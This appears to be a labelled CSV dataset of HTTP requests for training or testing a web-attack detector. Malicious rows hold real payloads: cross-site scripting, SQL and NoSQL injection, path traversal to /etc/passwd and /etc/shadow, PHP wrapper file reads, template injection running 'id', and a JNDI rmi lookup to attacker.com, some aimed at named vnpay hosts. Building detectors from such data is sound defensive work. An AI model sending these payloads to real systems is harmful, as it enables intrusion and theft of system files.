method,path,query,headers,body,ua,label
GET,/,php://filter/convert.base64-encode/resource=index.php,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/webadmin/deny/index.php,dpid=1&dpruleid=1&cat=1&ttl=5018400&groupname=<group_name_eg_netsweeper_student_allow_internet_access&policyname=auto_created&username=root&userip=127.0.0.1&connectionip=127.0.0.1&nsphostname=netsweeper&url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nmap Scripting Engine,1
GET,/filter/jmol/js/jsmol/php/jsmol.php,call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",1
POST,/auth/password-reset-request,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/search,q=C%23,Content-Type: application/json,,,0
DELETE,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
GET,/search,q=admin'--,Host: example.com; Accept: */*,,Nikto/2.1.6,1
POST,/,,Content-Type: application/json,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/analytics/metric,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/stores/find,zip=10001&distance=10,Content-Type: application/json,,,0
GET,/login,q=http://127.0.0.1:8080/admin,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/robots.txt,,Authorization: Bearer token123,,,0
GET,/,,Authorization: Bearer token123; Payload: ..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/maps/v2/tile/10/512/324.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/auth/logout/confirm,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/favicon.ico,,,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: //////////////////etc/passwd",,,1
GET,/,,Content-Type: application/json; Payload: rmi://attacker.com:1099/Exploit,,,1
GET,/,,Authorization: Bearer token123; Payload: | id,,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/search,q=C%23,Content-Type: application/json,,,0
DELETE,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/blog/future-of-ai-2026,,Content-Type: application/json,,,0
GET,/homess,,Content-Type: application/json,,,0
GET,/ws/notifications,,Content-Type: application/json,,,0
POST,/,,Content-Type: application/json,{{7*7}}{{ '7'*7 }},,1
GET,/,id=0x27204f52202731273d2731,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: php://input",,,1
DELETE,/search,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nmap Scripting Engine,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: php://input",,,1
POST,/,,Content-Type: application/json,"{""alg"":""none""}",,1
GET,/api/v1/ping,,Content-Type: application/json,,,0
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,<svg/onload=alert(1)>,Authorization: Bearer token123,,,1
GET,/list-editor/index.html,"reloaded&page=3"">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/604.2.4 (KHTML, like Gecko) Version/9.1.2 Safari/604.2.4",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/604.2.4 (KHTML, like Gecko) Version/9.1.2 Safari/604.2.4",1
GET,/,,Authorization: Bearer token123; Payload: ..%c0%af..%c0%af..%c0%afetc/passwd,,,1
PUT,/api/v1/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/p/thuong-hieu-jovikids,_rsc=3gizp,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: _ga=GA1.1.615918601.1770767009; _ga_1XRVJ9DDS6=GS2.1.s1770767009$o1$g0$t1770767009$j60$l0$h0; _gcl_au=1.1.80907901.1770767009; _tt_enable_cookie=1; _ttp=01KH4Z0J2B4EV1Q51VKB9K4EJV_.tt.1; _fbp=fb.1.1770767010016.212025117911598611; ttcsid_CQQA2PJC77U11VCBE7G0=1770767009908::nRr3FqH4KttdkhrQZwgH.1.1770767081914.1; ttcsid_CQNEHUJC77UD2I8MDM90=1770767009905::J5VBygMTwDr-QDIpLC-p.1.1770767081962.1; ttcsid=1770767009906::iBP7HVvtMO6SwInTxzYn.1.1770767081962.0; Host: agri-v2.vnshop.vn; Next-Router-Prefetch: 1; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1004%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22VBA%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22landing%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22ghe-o-to-tre-em%22%2C%22c%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /landing/ghe-o-to-tre-em; Referer: https://agri-v2.vnshop.vn/landing/ghe-o-to-tre-em; Rsc: 1; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 16; SM-A556E Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.109 Mobile Safari/537.36; X-Requested-With: com.vnpay.Agribank3g",,"Mozilla/5.0 (Linux; Android 16; SM-A556E Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.109 Mobile Safari/537.36",0
GET,/PhpSpreadsheet/Writer/PDF/DomPDF.php,input_file=php://filter/resource=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42",,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42",1
POST,/admin,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
DELETE,/login,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Content-Type: application/json; Payload: ..%2f..%2f..%2fetc%2fshadow,,,1
